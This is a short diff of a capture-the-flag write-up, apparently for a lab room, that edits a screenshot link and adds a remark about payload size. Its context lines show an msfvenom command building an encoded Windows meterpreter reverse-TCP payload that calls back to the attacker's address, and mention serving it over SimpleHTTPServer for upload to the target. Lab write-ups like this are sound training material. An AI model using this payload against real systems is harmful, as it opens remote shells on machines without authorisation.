@@ -91,9 +91,9 @@ Now let's upgrade our shell to a meterpreter one. To do so we need to create a p
 msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -o payload.exe LHOST=YOUR_IP_ADDRESS LPORT=CHOOSE_A_PORT
 ```
 
-![image](https://user-images.githubusercontent.com/76821053/131248679-423ff372-f126-427c-ac02-2d18f0380380.png)
+![image](https://user-images.githubusercontent.com/76821053/131249292-4efa51fe-c0cf-4e8d-be24-6f5972d5d5ea.png)
 
-In this case i created a meterpreter .exe payload encoded with shikata_ga_nai.
+In this case i created a meterpreter .exe payload encoded with shikata_ga_nai. If we check the size of the payload we can answer on of the questions of the room.
 
 To upload this payload to the target machine we need once again to host this file in a SimpleHTTPServer:
 
